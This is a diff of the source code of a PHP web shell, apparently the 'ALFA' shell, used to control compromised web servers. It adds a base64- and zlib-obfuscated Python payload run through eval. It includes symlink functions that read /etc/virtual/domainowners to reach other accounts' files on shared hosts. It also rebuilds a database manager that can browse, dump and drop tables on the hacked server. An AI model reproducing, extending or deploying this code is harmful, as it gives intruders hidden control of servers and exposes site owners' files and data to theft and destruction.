+	$py = '#!/usr/bin/python'."\nimport zlib, base64\nalfa_data='".__ALFA_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
 	$cginame = "symperl.alfa";
 	$source = $perl;
 	$lang = "perl";
@@ -4644,7 +4337,7 @@ $sym_dir = 'alfasymlinkphp/'.$rand_dir.'/';
 alfacgihtaccess('sym', $sym_dir, $symname);
 _alfa_symlink("$path","$sym_dir/$symname");
 echo __pre();
-echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
+echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__ALFA_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
 }
 }else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";}
 }
@@ -4676,7 +4369,7 @@ if(!$is_posix && !$can_runcmd){
 }
 echo $table_header;
 $count=1;
-$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
+$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
 foreach($lines as $line){
 	$domain = "";
 	$owner = "";
@@ -4770,7 +4463,7 @@ if(_alfa_file_exists("/etc/virtual/domainowners")){
 $sole = _alfa_file("/etc/virtual/domainowners");
 $count=1;
 echo $table_header;
-$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
+$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
 if($sole){
 	foreach($sole as $visible){
 		if(@strstr($visible,":")){
@@ -4862,23 +4555,25 @@ echo "</div>";
 alfafooter();
 }
 function alfasql(){
-if(!isset($_POST['sql_host'])){
-$_POST['sql_host'] = $_SESSION["sql_host"];
-$_POST['sql_login'] = $_SESSION["sql_login"];
-$_POST['sql_pass'] = $_SESSION["sql_pass"];
-$_POST['sql_base'] = $_SESSION["sql_base"];
-}
 class DbClass{
 public $type;
 public $link;
 public $res;
+public $mysqli_connect_error = false;
+public $mysqli_connect_error_msg = "";
 function __construct($type){
 $this->type = $type;
 }
 function connect($host, $user, $pass, $dbname){
 switch($this->type){
 case 'mysql':
-if($this->link = @mysqli_connect($host,$user,$pass,$dbname)) return true;
+if($this->link = @mysqli_connect($host,$user,$pass,$dbname)){
+	return true;
+}else{
+	$this->mysqli_connect_error = true;
+	$this->mysqli_connect_error_msg = mysqli_connect_error();
+	return false;
+}
 break;
 case 'pgsql':
 $host = explode(':', $host);
@@ -4982,280 +4677,357 @@ break;
 }
 return false;
 }
-function dump($table, $fp = false){
-switch($this->type){
-case 'mysql':
-$res = $this->query('SHOW CREATE TABLE `'.$table.'`');
-$create = mysqli_fetch_array($res);
-$sql = $create[1].";\n";
-if($fp) fwrite($fp, $sql); else echo($sql);
-$this->query('SELECT * FROM `'.$table.'`');
-$head = true;
-while($item = $this->fetch()){
-$columns = array();
-foreach($item as $k=>$v) {
-if($v == null)
-$item[$k] = "''";
-elseif(is_numeric($v))
-$item[$k] = $v;
-else
-$item[$k] = "'".@mysqli_real_escape_string($this->link, $v)."'";
-$columns[] = "`".$k."`";
-}
-if($head) {
-$sql = 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
-$head = false;
-} else
-$sql = "\n\t,(".implode(", ", $item).')';
-if($fp) fwrite($fp, $sql); else echo($sql);
-}
-if(!$head)
-if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
-break;
-case 'pgsql':
-$this->query('SELECT * FROM '.$table);
-while($item = $this->fetch()) {
-$columns = array();
-foreach($item as $k=>$v) {
-$item[$k] = "'".addslashes($v)."'";
-$columns[] = $k;
-}
-$sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
-if($fp) fwrite($fp, $sql); else echo($sql);
-}
-break;
-}
-return false;
-}
 };
 $db = new DbClass($_POST['type']);
-if(@$_POST['alfa1']=='dumpfile'||@$_POST['alfa1']=='droptbl'){
-$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
-$db->selectdb($_POST['sql_base']);
-switch($_POST['charset']){
-case "Windows-1251": $db->setCharset('calfa1251'); break;
-case "UTF-8": $db->setCharset('utf8'); break;
-case "KOI8-R": $db->setCharset('koi8r'); break;
-case "KOI8-U": $db->setCharset('koi8u'); break;
-case "calfa866": $db->setCharset('calfa866'); break;
-}
-$json = json_decode($_POST['alfa2'],true);
-if(count($json['tbl'])>0){
-if($_POST['alfa1']=='dumpfile'){
-if($fp = @fopen($json['file'],'w')){
-foreach($json['tbl'] as $v)$db->dump($v, $fp);
-fclose($fp);
-$dumpStatus = true;
-}}else{
-foreach($json['tbl'] as $v)$db->query('DROP TABLE '.$v);
-}
-}
-unset($_POST['alfa2']);
-}
 alfahead();
+$form_visibility = "table";
+if(isset($_POST['sql_host'])){
+	$connection_db = $db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
+	if($connection_db && !empty($_POST['sql_base'])){
+		$form_visibility = "none";
+	}
+}
+$database_list = array();
 echo "
-<div class=header><center><div class='txtfont_header'>| Sql Manager |</div><p>".getConfigHtml('all')."</p></center>
-<form name='sf' method='post' onsubmit='fs(this);return false;'><table cellpadding='2' cellspacing='0'><tr>
+<div class='header' style='min-height:300px;'>".($form_visibility!="none"?"<center><div class='txtfont_header'>| Sql Manager |</div><p>".getConfigHtml('all')."</p></center><div style='text-align:center;margin-bottom: 10px;'><button class='connection-his-btn db-opt-id' onclick='alfaShowConnectionHistory(this);' mode='on'>Connection History</button><div class='connection_history_holder'></div></div>":"")."
+<div class='sf' class='db-opt-id'><table style='margin: 0 auto;".($form_visibility=="none"?"display:none;":"")."' cellpadding='2' cellspacing='0'><tr>
 <td><div class=\"txtfont\">TYPE</div></td><td><div class=\"txtfont\">HOST</div></td><td><div class=\"txtfont\">DB USER</div></td><td><div class=\"txtfont\">DB PASS</div></td><td><div class=\"txtfont\">DB NAME</div></td><td></td></tr><tr>
-<input type='hidden' name='a' value=Sql><input type='hidden' name='alfa1' value='query'><input type='hidden' name='alfa2' value=''><input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'><input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'UTF-8') ."'>
-<td><select name='type'><option value='mysql' ";
-if(@$_POST['type']=='mysql')echo 'selected';
-echo ">MySql</option><option value='pgsql' ";
-if(@$_POST['type']=='pgsql')echo 'selected';
-echo ">PostgreSql</option></select></td>
+<td><select name='type'><option value='mysql' selected>mysql</option></select></td>
 <td><input type='text' name='sql_host' id='db_host' value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'></td>
 <td><input type='text' name='sql_login' id='db_user' value='". (empty($_POST['sql_login'])?'':htmlspecialchars($_POST['sql_login'])) ."'></td>
 <td><input type='text' name='sql_pass' id='db_pw' value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'></td><td>";
 $tmp = "<input type='text' name='sql_base' id='db_name' value='". (empty($_POST['sql_base'])?'':htmlspecialchars($_POST['sql_base'])) ."'>";
 if(isset($_POST['sql_host'])){
-if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
-$_SESSION["sql_host"] = $_POST['sql_host'];
-$_SESSION["sql_login"] = $_POST['sql_login'];
-$_SESSION["sql_pass"] = $_POST['sql_pass'];
-$_SESSION["sql_base"] = $_POST['sql_base'];
-switch($_POST['charset']){
-case "Windows-1251": $db->setCharset('calfa1251'); break;
-case "UTF-8": $db->setCharset('utf8'); break;
-case "KOI8-R": $db->setCharset('koi8r'); break;
-case "KOI8-U": $db->setCharset('koi8u'); break;
-case "calfa866": $db->setCharset('calfa866'); break;
-}
+if($connection_db){
 $db->setCharset('utf8');
 $db->listDbs();
 echo "<select name=sql_base><option value=''></option>";
 while($item = $db->fetch()) {
 list($key, $value) = each($item);
+$database_list[] = $value;
 echo '<option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'>'.$value.'</option>';
 }
 echo '</select>';
+}else{
+	echo $tmp;
 }
-else echo $tmp;
 }else
 echo $tmp;
+$curr_mysql_id = $_POST['current_mysql_id'];
 echo "</td>
-<td><input type='submit' value=' '></td>
+<td><button onclick='fs(this);return false;' class='db-opt-id db-connect-btn'>Connect</button></td>
 <td><input type='checkbox' name='sql_count' value='on'" . (empty($_POST['sql_count'])?'':' checked') . "> <div class=\"txtfont\">count the number of rows</div></td>
 </tr>
-</table>
-<script>mysql_cache['host']='".addslashes($_POST['sql_host'])."';mysql_cache['user']='".addslashes($_POST['sql_login'])."';mysql_cache['pass']='".addslashes($_POST['sql_pass'])."';mysql_cache['db']='".addslashes($_POST['sql_base'])."';mysql_cache['charset']='".addslashes($_POST['charset'])."';mysql_cache['type']='".addslashes($_POST['type'])."';mysql_cache['count']='".addslashes($_POST['sql_count'])."'</script>
-";
+</table>";
+if($db->mysqli_connect_error){
+	echo '<div style="text-align: center;font-size: 17px;margin-top: 18px;">'.$db->mysqli_connect_error_msg.'</div>';
+}
+if(!empty($curr_mysql_id)){
+	$sql_title_db = "";
+	if(!empty($_POST['sql_base'])){
+		$sql_title_db = "d.querySelector('#tab_".$curr_mysql_id." span').innerHTML='".addslashes($_POST['sql_base'])."';";
+	}
+	echo "<script>mysql_cache['".$curr_mysql_id."']['host']='".addslashes($_POST['sql_host'])."';mysql_cache['".$curr_mysql_id."']['user']='".addslashes($_POST['sql_login'])."';mysql_cache['".$curr_mysql_id."']['pass']='".addslashes($_POST['sql_pass'])."';mysql_cache['".$curr_mysql_id."']['db']='".addslashes($_POST['sql_base'])."';mysql_cache['".$curr_mysql_id."']['charset']='".addslashes($_POST['charset'])."';mysql_cache['".$curr_mysql_id."']['type']='".addslashes($_POST['type'])."';mysql_cache['".$curr_mysql_id."']['count']='".addslashes($_POST['sql_count'])."';".$sql_title_db."alfaConnectionHistoryUpdate();</script>";
+}
 if(isset($db) && $db->link){
-echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
 if(!empty($_POST['sql_base'])){
-$db->selectdb($_POST['sql_base']);
-echo "<tr><td width=1 style='border-top:2px solid #666;'><div class='txtfont'>Tables:</div><br><br>";
-$tbls_res = $db->listTables();
-while($item = $db->fetch($tbls_res)){
-list($key, $value) = each($item);
-if(!empty($_POST['sql_count']))
-$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM `'.$value.'`'));
-$value = htmlspecialchars($value);
-echo "<nobr><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a href='javascript:void(0);' onclick=\"fs('0','".$value."')\"><span class='mysql_tables' style='font-weight:unset;'>".$value."</span></a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small><span style='font-weight:unset;' class='mysql_table_count'>({$n['n']})</span></small>") . "</nobr><br>";
+echo "<div class='mysql-main'><div mode='block' onclick='alfaMysqlTablePanelCtl(this);' class='tables-panel-ctl db-opt-id'>&#x3C;&#x3C;</div><div class='mysql-tables'><div><input placeholder=\"Filter Table\" style='padding: 0;margin-left: 11px;text-align:center;' type='text' name='filter_all'><button class='db-opt-id' onclick='alfaMysqlFilterAllTable(this);return false;'>Search</button></div><div class='block'><a sql_count='".(empty($_POST['sql_count'])?"false":"true")."' mode='closed' onclick='alfaMysqlFilterAllTable(this,true);' class='expander parent-expander db-opt-id' href='javascript:void(0);'><img src='http://solevisible.com/icons/menu/b_plus.png' title='Expand/Collapse All DataBases' alt='Expand/Collapse All DataBases'></a></div><ul style='margin-top: 28px;'>";
+foreach ($database_list as $db_name) {
+	echo '<li><div class="block"><i></i><b></b><a sql_count="'.(empty($_POST['sql_count'])?"false":"true").'" db_target="'.$db_name.'" onclick="alfaMysqlExpander(this);" class="expander cls-'.$db_name.'-expander db-opt-id" href="javascript:void(0);"><img src="http://solevisible.com/icons/menu/'.($db_name == $_POST['sql_base']?"b_minus.png":"b_plus.png").'" title="Expand/Collapse" alt="Expand/Collapse"></a></div><span class="db_name">'.$db_name.'</span><div class="clearfloat"></div><div db_name="'.$db_name.'" mode="'.($db_name == $_POST['sql_base']?"loaded":"no").'" class="list_container cls-'.$db_name.'"><div>';
+	if($db_name == $_POST['sql_base']){
+		$db->selectdb($_POST['sql_base']);
+		$tbls_res = $db->listTables();
+		echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-'.$db_name.'" placeholder="Filter Table" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';
+		while($item = $db->fetch($tbls_res)){
+		list($key, $value) = each($item);
+		if(!empty($_POST['sql_count']))
+		$n = $db->fetch($db->query('SELECT COUNT(*) as n FROM `'.$value.'`'));
+		$value = htmlspecialchars($value);
+		echo "<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='".$value."'>&nbsp;<a class='db-opt-id' db_target='".$db_name."' href='javascript:void(0);' onclick=\"alfaLoadTableData(this,'".$value."')\"><span class='mysql_tables' style='font-weight:unset;'>".$value."</span></a>" . (empty($_POST['sql_count'])?'&nbsp;':" <small><span style='font-weight:unset;' class='mysql_table_count'>({$n['n']})</span></small>") . "</div></li>";
+		}
+		echo '</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="alfaMysqlTablesEvil(this);" class="db-opt-id" target=".cls-'.$db_name.'" type="checkbox" class="db-opt-id"><select onchange="alfaMysqlTablesDumpDrop(this);" class="db-opt-id" target=".cls-'.$db_name.'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="alfaMysqlTablesDumpDropBtn(this);return false;" class="db-opt-id" db_target="'.$db_name.'" target=".cls-'.$db_name.'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>';
+	}
+	echo "</div></li>";
 }
-echo "<p><input type='checkbox' onclick='is();'> <input type='button' value=' Dump ' onclick=\"fs('4');\" class='button'> <input type='button' value=' Drop ! ' onclick=\"fs('5');\" class='button'></p><div class='txtfont'>File path:</div><input type='text' id='dumpfile' name='file' value='dump.sql'>".($dumpStatus?'<p><a class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\'dump.sql\', \'download\')"><font color="#0F0">~ Download File ~</font></a></p>':'')."</td><td style='border-top:2px solid #666;'>";
-if(@$_POST['alfa1'] == 'select'){
-$_POST['alfa1'] = 'query';
-$_POST['alfa3'] = $_POST['alfa3']?$_POST['alfa3']:1;
-$db->query('SELECT COUNT(*) as n FROM `'.$_POST['alfa2'].'`');
-$num = $db->fetch();
-$pages = ceil($num['n'] / 30);
-echo "<span>".$_POST['alfa2']."</span> ({$num['n']} records) Page # <input type=text name='alfa3' value=" . ((int)$_POST['alfa3']) . ">";
-echo " of $pages";
-if($_POST['alfa3'] > 1)
-echo " <a href='javascript:void(0);' onclick=fs('1','[\"".$_POST['alfa2']."\",\"".($_POST['alfa3']-1)."\"]')>&lt; Prev</a>";
-if($_POST['alfa3'] < $pages)
-echo " <a href='javascript:void(0);' onclick=fs('1','[\"".$_POST['alfa2']."\",\"".($_POST['alfa3']+1)."\"]')>Next &gt;</a>";
-$_POST['alfa3']--;
-$cache_table = $_POST['alfa2'];
-if($_POST['type']=='pgsql')
-$_POST['alfa2'] = 'SELECT * FROM `'.$_POST['alfa2'].'` LIMIT 30 OFFSET '.($_POST['alfa3']*30);
-else
-$_POST['alfa2'] = 'SELECT * FROM `'.$_POST['alfa2'].'` LIMIT '.($_POST['alfa3']*30).',30';
-echo "<br><br>";
+echo "</ul></div><div class='mysql-query-results'><div class='mysql-query-result-tabs'><div class='db-opt-id mysql-query-selected-tab' target='.mysql-query-result-content' onclick='alfaMysqlTabCtl(this);'>Result</div><div class='db-opt-id' target='.mysql-query-form' onclick='alfaMysqlTabCtl(this);'>Query</div><div class='db-opt-id' target='.mysql-search-area' onclick='alfaMysqlTabCtl(this);'>Search</div><div class='db-opt-id' target='.mysql-structure' onclick='alfaMysqlTabCtl(this);'>Structure</div><div class='db-opt-id' target='.mysql-insert-row' onclick='alfaMysqlTabCtl(this);'>Insert</div><div style='display:none;' class='db-opt-id' target='.mysql-edit-row' onclick='alfaMysqlTabCtl(this);'>Edit</div></div><div class='mysql-query-content mysql-insert-row mysql-hide-content'></div><div class='mysql-query-content mysql-edit-row mysql-hide-content'></div><div class='mysql-query-content mysql-search-area mysql-hide-content'></div><div class='mysql-query-content mysql-structure mysql-hide-content'></div><div class='mysql-query-content mysql-query-form mysql-hide-content'><div style='margin-bottom: 5px;'><span>Query:</span></div><textarea name='query' style='width:90%;height:100px'></textarea><p><div style='float:left;margin-left: 30px;'><input class='button db-opt-id' db_target='".$_POST['sql_base']."' onclick='alfaMysqlQuery(this);return false;' type='submit' value=' '></div></p></div><div class='mysql-query-content mysql-query-result-content'><div class='mysql-query-result-header'><div style='margin-bottom: 10px;' class='mysql-query-reporter'></div><div class='mysql-query-pager'></div></div><div class='mysql-query-table'></div></div></form></td></tr>";
 }
-if((@$_POST['alfa1'] == 'query') && !empty($_POST['alfa2'])) {
-$prikey = $db->fetch($db->query("SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '".@addslashes($_POST['sql_base'])."' AND TABLE_NAME = '".@addslashes($cache_table)."' AND COLUMN_KEY = 'PRI'"));
-$db->query(@$_POST['alfa2']);
-if($db->res !== false){
-$title = false;
-echo '<table width="100%" cellspacing="1" cellpadding="2" class="main" style="background-color:#292929" border="1">';
-$line = 1;
-while($item = $db->fetch()) {
-if(!$title){
-echo '<tr><th>#</th>';
-foreach($item as $key => $value){
-echo '<th>'.$key.'</th>';
-}
-reset($item);
-$title=true;
-echo '</tr><tr>';
-$line = 2;
-}
-if($cache_table!=''){
-	$cacheMsg = '<a href="javascript:void(0);" onclick=fs(\'2\',\'["'.$cache_table.'","'.(!$prikey['COLUMN_NAME']?0:$prikey['COLUMN_NAME']).'","'.__ZW5jb2Rlcg(json_encode((!$prikey['COLUMN_NAME']?$item:$item[$prikey['COLUMN_NAME']]))).'"]\')>Edit</a>';
-}else{
-	$cacheMsg ='-';
-}
-echo '<tr class="l'.$line.'"><td>'.$cacheMsg.'</td>';
-$line = $line==1?2:1;
-foreach($item as $key => $value){
-if($value == null)
-echo '<td><i>null</i></td>';
-else
-echo '<td>'.nl2br(htmlspecialchars($value)).'</td>';
-}
-echo '</tr>';
-}
-echo '</table>';
-} else {
-echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
-}
-}
-echo('</form>');
-if((@$_POST['alfa1'] == 'edit') && !empty($_POST['alfa2'])){
-$data = explode(':',$_POST['alfa3']);
-echo ('<p><div class="txtfont">Table:</div> <font color="#0F0">'.$data[0].'</font></p>');
-echo("<form onsubmit='fsu(this);return false;'><table border='1'>");
-if($data[1] != '0'){
-$data[2] = __ZGVjb2Rlcg($data[2]);
-$data[2] = str_replace('"','',$data[2]);
-$fetch = $db->fetch($db->query("SELECT * FROM `".$data[0]."` WHERE `".$data[1]."` = '".$data[2]."'"));
-$fetch['__ALFAKEY'] = $data[1];
-$fetch['__ALFAKEYVAL'] = $data[2];
-}else{
-$d = __ZGVjb2Rlcg($data[2]);
-$fetch = json_decode($d, true);
-}
-foreach($fetch as $key => $value){
-if($key=='__ALFAKEY'||$key=='__ALFAKEYVAL')continue;
-$value = htmlspecialchars($value);
-echo("<tr><td>$key</td><td><input name='$key' value='$value' /></td></tr>");
-}
-echo("</table><input type='hidden' name='__ALFADATA' value='".__ZW5jb2Rlcg(json_encode(($data[1] != '0'?array('__ALFAKEY'=>$data[1],'__ALFAKEYVAL'=>$data[2]):$fetch)))."'><input type='hidden' name='__ALFATBL' value='{$data[0]}'><input type='submit' value=' '></form>");
-}
-if((@$_POST['alfa1'] == 'update') && !empty($_POST['alfa2'])){
-$data = json_decode($_POST['alfa2'], true);
-$alfadata = $data['__ALFADATA'];
-$data2 = json_decode(__ZGVjb2Rlcg($alfadata), true);
-$keyval = array();
-echo ('<p><div class="txtfont">Table:</div> <font color="#0F0">'.$data['__ALFATBL'].'</font></p>');
-echo("<form onsubmit='fsu(this);return false;'><table border='1'>");
-$set = '';
-foreach($data as $key => $value){
-if($key=='__ALFATBL'||$key=='__ALFADATA')continue;
-if($data2['__ALFAKEY']==$key){
-$keyval['__ALFAKEY'] = $key;
-$keyval['__ALFAKEYVAL'] = $value;
-}
-$set .= "`$key` = '".addslashes($value)."',";
-$value = htmlspecialchars($value);
-echo("<tr><td>$key</td><td><input name='$key' value='$value' /></td></tr>");
-}
-unset($data['__ALFADATA']);
-
-echo("</table><input type='hidden' name='__ALFADATA' value='".__ZW5jb2Rlcg(json_encode((isset($data2['__ALFAKEY'])?array('__ALFAKEY'=>$keyval['__ALFAKEY'],'__ALFAKEYVAL'=>$keyval['__ALFAKEYVAL']):$data)))."'><input type='hidden' name='__ALFATBL' value='{$data['__ALFATBL']}'><input type='submit' value=' '></form>");
-
-if(!isset($data2['__ALFAKEY'])){
-$where = '';
-foreach($data2 as $key => $value){
-if($key=='__ALFATBL'||$key=='__ALFADATA')continue;
-$value = addslashes($value);
-$where .= "`$key` = '$value' AND ";
-}
-$where = substr($where, 0, -4);
-}else{
-$where = "`{$data2['__ALFAKEY']}` = '".addslashes($data2['__ALFAKEYVAL'])."'";
-}
-$set = substr($set, 0, -1);
-$db->fetch($db->query("UPDATE `{$data['__ALFATBL']}` SET $set WHERE $where"));
-if($db->error())
-echo '<div><b>Error:</b> '.htmlspecialchars($db->error()).'</div>';
-else echo("Success...!");
-}
-if($_POST['alfa1']!='edit'&&$_POST['alfa1']!='update'){
-echo "<p>Query:</p><form onsubmit='fs(this);return false;'>
-<input type='hidden' name='alfa1' value='query'/>
-<textarea name='query' style='width:100%;height:100px'>";
-echo $_POST['alfa1']!='loadfile'?htmlspecialchars($_POST['alfa2']):'';
-echo "</textarea><p><center><input type=submit value=' '></center></p></form>";
-}
-echo "</td></tr>";
-}
-echo "</table></form><br/>";
-if($_POST['type']=='mysql') {
-$db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
-if($db->fetch())
-echo "<form onsubmit=\"fs('3',this.f.value);return false;\"><div class='txtfont'>Load file:</div> <input class='toolsInp' type='text' name='f'> <input type='submit' value=' '></form>";
-}
-if(@$_POST['alfa1'] == 'loadfile'){
-$file = $db->loadFile($_POST['alfa2']);
-echo '<pre class=ml1>'.htmlspecialchars($file['file']).'</pre>';
-}
+echo "</table></div>";
+echo "</div>";
 }else{
 echo htmlspecialchars($db->error());
 }
 echo '</div>';
 alfafooter();
+}
+function alfaSql_manager_api(){
+	$db = $_POST["alfa1"];
+	$type = $_POST["alfa2"];
+	$sql_count = $_POST["alfa3"] == "true" ? true : false;
+	$db = @json_decode($db, true);
+	$conn = @mysqli_connect($db["host"], $db["user"], $db["pass"], $db["db"]);
+	@mysqli_set_charset($conn, "utf8");
+	if($conn){
+		if($type == "load_all_tables"){
+			$tables = array();
